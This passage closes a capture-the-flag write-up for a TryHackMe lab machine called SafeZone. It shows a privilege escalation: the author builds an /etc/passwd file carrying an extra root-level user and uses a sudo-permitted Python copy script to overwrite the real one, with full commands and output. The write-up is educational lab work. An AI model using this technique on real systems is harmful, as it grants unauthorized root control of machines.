daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
```

Got ya, I see your trick.

**This `bk.py` is basically copying file to a new place.**

**Now, what if I copy a malicious `passwd` file, and then override the original `/etc/passwd`?**

- Generate `passwd`'s password hash:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/SafeZone]
└─# openssl passwd password
$1$TBtvdgJG$guxWNCxXjIE4ATrmP2pIE1
```

- Create a malicious `passwd` file

```
yash@safezone:/opt$ cd /dev/shm
yash@safezone:/dev/shm$ nano passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
yash:x:1000:1000:yash,,,:/home/yash:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
files:x:1001:1001:,,,:/home/files:/bin/bash
pwned:$1$TBtvdgJG$guxWNCxXjIE4ATrmP2pIE1:0:0:root:/root:/bin/bash
```

In the last line, we added a new user called `pwned`, with password `password`, and root privilege.

- Copy our malicious `passwd` file to `/etc/passwd`:

```
yash@safezone:/dev/shm$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /dev/shm/passwd
Enter destination: /etc/passwd
Enter Password: anything
```

- Verify it works:

```
yash@safezone:/dev/shm$ tail -n 1 /etc/passwd
pwned:$1$TBtvdgJG$guxWNCxXjIE4ATrmP2pIE1:0:0:root:/root:/bin/bash
```

**Nice! Let's Switch User to `pwned`!**
```
yash@safezone:/dev/shm$ su pwned
Password: 
root@safezone:/dev/shm# whoami;hostname;id;ip a
root
safezone
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:94:90:5e:ae:39 brd ff:ff:ff:ff:ff:ff
    inet 10.10.245.138/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2218sec preferred_lft 2218sec
    inet6 fe80::94:90ff:fe5e:ae39/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
root@safezone:/dev/shm# cat /root/root.txt 
THM{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating Hidden Directories & Files via `gobuster`
2. Bypassing Brute Force Protection
3. Exploiting Local File Inclusion (LFI) & Remote Code Execution (RCE) via Log Poisoning 
4. Cracking Password Hash via `john`
5. Port Forwarding via `chisel`
6. Exploiting Blind OS Command Injection
7. Vertical Privilege Escalation via Vulnerable Python Script